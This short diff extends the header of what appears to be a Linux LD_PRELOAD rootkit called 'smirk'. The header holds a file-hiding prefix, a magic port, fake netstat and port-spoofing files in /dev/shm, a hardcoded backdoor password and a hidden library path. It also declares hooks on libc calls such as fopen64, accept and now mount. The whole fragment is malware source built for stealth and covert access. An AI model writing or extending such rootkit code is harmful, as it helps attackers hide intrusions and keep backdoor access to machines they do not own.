@@ -20,6 +20,7 @@
 #define MAGIC_PREFIX "^\\.smirk" //regex format
 #define MAGIC_PORT 65535
 #define FAKE_NETSTAT_FILE "/dev/shm/.smirknet-"
+#define PORTSPOOF_FILE "/dev/shm/.smirknet"
 #define PASSWORD "SmirkFTW"
 #define MAGIC_LIBPATH "/lib/.smirk.so"
 
@@ -33,3 +34,4 @@ FILE *(*hooked_fopen64)(const char *, const char *);
 int (*hooked_ioctl)(int , unsigned long , unsigned long *);
 int (*hooked_accept)(int, struct sockaddr_in *, socklen_t *);
 int (*hooked_accept4)(int, struct sockaddr_in *, socklen_t *, int);
+int (*hooked_mount)(const char *, const char *, const char *, unsigned long, const void *);
